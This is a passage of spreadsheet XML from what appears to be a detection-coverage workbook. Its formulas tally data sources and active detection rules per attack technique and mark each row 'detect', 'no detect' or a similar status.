        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S1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8" t="s">
        <v>368</v>
      </c>
      <c r="U18" t="s">
        <v>439</v>
      </c>
      <c r="V18" t="s">
        <v>370</v>
      </c>
      <c r="W18" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="19" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A19" t="s">
        <v>440</v>
      </c>
      <c r="B19" t="s">
        <v>440</v>
      </c>
      <c r="C19" t="s">
        <v>33</v>
      </c>
      <c r="D19" t="s">
        <v>8</v>
      </c>
      <c r="E19" t="s">
        <v>434</v>
      </c>
      <c r="F19" s="9">
        <f t="shared" si="0"/>
        <v>3</v>
      </c>
      <c r="G19" s="9" cm="1">
        <f t="array" ref="G19">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H19" s="9" cm="1">
        <f t="array" ref="H19">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I19" s="9" cm="1">
        <f t="array" ref="I19">IF(SUM(IF($C19=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C19=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v>1</v>
      </c>
      <c r="J19" s="9" t="str" cm="1">
        <f t="array" ref="J1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9" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M19" s="9" cm="1">
        <f t="array" ref="M19">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N19" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>1</v>
      </c>
      <c r="O19" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>1</v>
      </c>
      <c r="P19" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>detect</v>
      </c>
      <c r="S1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9" t="s">
        <v>368</v>
      </c>
      <c r="U19" t="s">
        <v>441</v>
      </c>
      <c r="V19" t="s">
        <v>442</v>
      </c>
      <c r="W19" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="20" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A20" t="s">
        <v>443</v>
      </c>
      <c r="B20" t="s">
        <v>443</v>
      </c>
      <c r="C20" t="s">
        <v>74</v>
      </c>
      <c r="D20" t="s">
        <v>12</v>
      </c>
      <c r="E20" t="s">
        <v>444</v>
      </c>
      <c r="F20" s="9">
        <f t="shared" si="0"/>
        <v>5</v>
      </c>
      <c r="G20" s="9" cm="1">
        <f t="array" ref="G20">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>4</v>
      </c>
      <c r="H20" s="9" cm="1">
        <f t="array" ref="H20">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>1</v>
      </c>
      <c r="I20" s="9" t="str" cm="1">
        <f t="array" ref="I20">IF(SUM(IF($C20=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C20=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J20" s="9" cm="1">
        <f t="array" ref="J2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20" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M20" s="9" cm="1">
        <f t="array" ref="M20">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N20" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O20" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P20" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S2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0" t="s">
        <v>368</v>
      </c>
      <c r="U20" t="s">
        <v>445</v>
      </c>
      <c r="V20" t="s">
        <v>446</v>
      </c>
      <c r="W20" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="21" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A21" t="s">
        <v>443</v>
      </c>
      <c r="B21" t="s">
        <v>447</v>
      </c>
      <c r="C21" t="s">
        <v>448</v>
      </c>
      <c r="D21" t="s">
        <v>12</v>
      </c>
      <c r="E21" t="s">
        <v>444</v>
      </c>
      <c r="F21" s="9">
        <f t="shared" si="0"/>
        <v>5</v>
      </c>
      <c r="G21" s="9" cm="1">
        <f t="array" ref="G21">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>4</v>
      </c>
      <c r="H21" s="9" t="str" cm="1">
        <f t="array" ref="H21">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I21" s="9" t="str" cm="1">
        <f t="array" ref="I21">IF(SUM(IF($C21=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C21=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J21" s="9" t="str" cm="1">
        <f t="array" ref="J2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1" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M21" s="9" cm="1">
        <f t="array" ref="M21">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N21" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O21" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P21" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S2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1" t="s">
        <v>368</v>
      </c>
      <c r="U21" t="s">
        <v>449</v>
      </c>
      <c r="V21" t="s">
        <v>446</v>
      </c>
      <c r="W21" t="b">
        <v>1</v>
      </c>
      <c r="X21" t="s">
        <v>443</v>
      </c>
    </row>
    <row r="22" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A22" t="s">
        <v>450</v>
      </c>
      <c r="B22" t="s">
        <v>450</v>
      </c>
      <c r="C22" t="s">
        <v>190</v>
      </c>
      <c r="D22" t="s">
        <v>8</v>
      </c>
      <c r="E22" t="s">
        <v>451</v>
      </c>
      <c r="F22" s="9">
        <f t="shared" si="0"/>
        <v>4</v>
      </c>
      <c r="G22" s="9" cm="1">
        <f t="array" ref="G22">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H22" s="9" cm="1">
        <f t="array" ref="H22">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I22" s="9" t="str" cm="1">
        <f t="array" ref="I22">IF(SUM(IF($C22=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C22=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J22" s="9" t="str" cm="1">
        <f t="array" ref="J2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2" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M22" s="9" cm="1">
        <f t="array" ref="M22">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N22" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O22" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P22" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S2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2" t="s">
        <v>386</v>
      </c>
      <c r="U22" t="s">
        <v>452</v>
      </c>
      <c r="V22" t="s">
        <v>453</v>
      </c>
      <c r="W22" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="23" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A23" t="s">
        <v>454</v>
      </c>
      <c r="B23" t="s">
        <v>454</v>
      </c>
      <c r="C23" t="s">
        <v>207</v>
      </c>
      <c r="D23" t="s">
        <v>6</v>
      </c>
      <c r="E23" t="s">
        <v>455</v>
      </c>
      <c r="F23" s="9">
        <f t="shared" si="0"/>
        <v>3</v>
      </c>
      <c r="G23" s="9" cm="1">
        <f t="array" ref="G23">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H23" s="9" cm="1">
        <f t="array" ref="H23">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I23" s="9" cm="1">
        <f t="array" ref="I23">IF(SUM(IF($C23=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C23=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v>2</v>
      </c>
      <c r="J23" s="9" t="str" cm="1">
        <f t="array" ref="J2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3" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M23" s="9" cm="1">
        <f t="array" ref="M23">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N23" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>2</v>
      </c>
      <c r="O23" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>1</v>
      </c>
      <c r="P23" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>detect</v>
      </c>
      <c r="S2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more detection rules than expected!</v>
      </c>
      <c r="T23" t="s">
        <v>368</v>
      </c>
      <c r="U23" t="s">
        <v>456</v>
      </c>
      <c r="V23" t="s">
        <v>457</v>
      </c>
      <c r="W23" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="24" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A24" t="s">
        <v>458</v>
      </c>
      <c r="B24" t="s">
        <v>458</v>
      </c>
      <c r="C24" t="s">
        <v>200</v>
      </c>
      <c r="D24" t="s">
        <v>8</v>
      </c>
      <c r="E24" t="s">
        <v>459</v>
      </c>
      <c r="F24" s="9">
        <f t="shared" si="0"/>
        <v>4</v>
      </c>
      <c r="G24" s="9" cm="1">
        <f t="array" ref="G24">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H24" s="9" cm="1">
        <f t="array" ref="H24">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>2</v>
      </c>
      <c r="I24" s="9" t="str" cm="1">
        <f t="array" ref="I24">IF(SUM(IF($C24=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C24=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J24" s="9" cm="1">
        <f t="array" ref="J2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1</v>
      </c>
      <c r="K24" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>2</v>
      </c>
      <c r="M24" s="9" cm="1">
        <f t="array" ref="M24">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>2</v>
      </c>
      <c r="N24" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>1</v>
      </c>
      <c r="O24" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0.5</v>
      </c>
      <c r="P24" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>detect</v>
      </c>
      <c r="S2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4" t="s">
        <v>425</v>
      </c>
      <c r="U24" t="s">
        <v>460</v>
      </c>
      <c r="V24" t="s">
        <v>461</v>
      </c>
      <c r="W24" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="25" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A25" t="s">
        <v>458</v>
      </c>
      <c r="B25" t="s">
        <v>462</v>
      </c>
      <c r="C25" t="s">
        <v>288</v>
      </c>
      <c r="D25" t="s">
        <v>8</v>
      </c>
      <c r="E25" t="s">
        <v>463</v>
      </c>
      <c r="F25" s="9">
        <f t="shared" si="0"/>
        <v>2</v>
      </c>
      <c r="G25" s="9" cm="1">
        <f t="array" ref="G25">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H25" s="9" t="str" cm="1">
        <f t="array" ref="H25">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I25" s="9" cm="1">
        <f t="array" ref="I25">IF(SUM(IF($C25=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C25=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v>1</v>
      </c>
      <c r="J25" s="9" t="str" cm="1">
        <f t="array" ref="J2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5" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M25" s="9" cm="1">
        <f t="array" ref="M25">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N25" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>1</v>
      </c>
      <c r="O25" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>1</v>
      </c>
      <c r="P25" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>detect</v>
      </c>
      <c r="S2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5" t="s">
        <v>368</v>
      </c>
      <c r="U25" t="s">
        <v>464</v>
      </c>
      <c r="V25" t="s">
        <v>465</v>
      </c>
      <c r="W25" t="b">
        <v>1</v>
      </c>
      <c r="X25" t="s">
        <v>458</v>
      </c>
    </row>
    <row r="26" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A26" t="s">
        <v>458</v>
      </c>
      <c r="B26" t="s">
        <v>466</v>
      </c>
      <c r="C26" t="s">
        <v>260</v>
      </c>
      <c r="D26" t="s">
        <v>8</v>
      </c>
      <c r="E26" t="s">
        <v>467</v>
      </c>
      <c r="F26" s="9">
        <f t="shared" si="0"/>
        <v>2</v>
      </c>
      <c r="G26" s="9" cm="1">
        <f t="array" ref="G26">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H26" s="9" t="str" cm="1">
        <f t="array" ref="H26">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I26" s="9" t="str" cm="1">
        <f t="array" ref="I26">IF(SUM(IF($C26=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C26=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J26" s="9" t="str" cm="1">
        <f t="array" ref="J2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6" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M26" s="9" cm="1">
        <f t="array" ref="M26">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N26" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O26" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P26" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S2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6" t="s">
        <v>368</v>
      </c>
      <c r="U26" t="s">
        <v>468</v>
      </c>
      <c r="V26" t="s">
        <v>469</v>
      </c>
      <c r="W26" t="b">
        <v>1</v>
      </c>
      <c r="X26" t="s">
        <v>458</v>
      </c>
    </row>
    <row r="27" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A27" t="s">
        <v>470</v>
      </c>
      <c r="B27" t="s">
        <v>470</v>
      </c>
      <c r="C27" t="s">
        <v>192</v>
      </c>
      <c r="D27" t="s">
        <v>8</v>
      </c>
      <c r="E27" t="s">
        <v>471</v>
      </c>
      <c r="F27" s="9">
        <f t="shared" si="0"/>
        <v>4</v>
      </c>
      <c r="G27" s="9" cm="1">
        <f t="array" ref="G27">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H27" s="9" cm="1">
        <f t="array" ref="H27">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I27" s="9" t="str" cm="1">
        <f t="array" ref="I27">IF(SUM(IF($C27=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C27=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J27" s="9" t="str" cm="1">
        <f t="array" ref="J2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7" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M27" s="9" cm="1">
        <f t="array" ref="M27">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N27" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O27" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P27" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S2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7" t="s">
        <v>425</v>
      </c>
      <c r="U27" t="s">
        <v>472</v>
      </c>
      <c r="V27" t="s">
        <v>473</v>
      </c>
      <c r="W27" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="28" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A28" t="s">
        <v>474</v>
      </c>
      <c r="B28" t="s">
        <v>474</v>
      </c>
      <c r="C28" t="s">
        <v>24</v>
      </c>
      <c r="D28" t="s">
        <v>12</v>
      </c>
      <c r="E28" t="s">
        <v>475</v>
      </c>
      <c r="F28" s="9">
        <f t="shared" si="0"/>
        <v>6</v>
      </c>
      <c r="G28" s="9" cm="1">
        <f t="array" ref="G28">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>4</v>
      </c>
      <c r="H28" s="9" cm="1">
        <f t="array" ref="H28">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>1</v>
      </c>
      <c r="I28" s="9" t="str" cm="1">
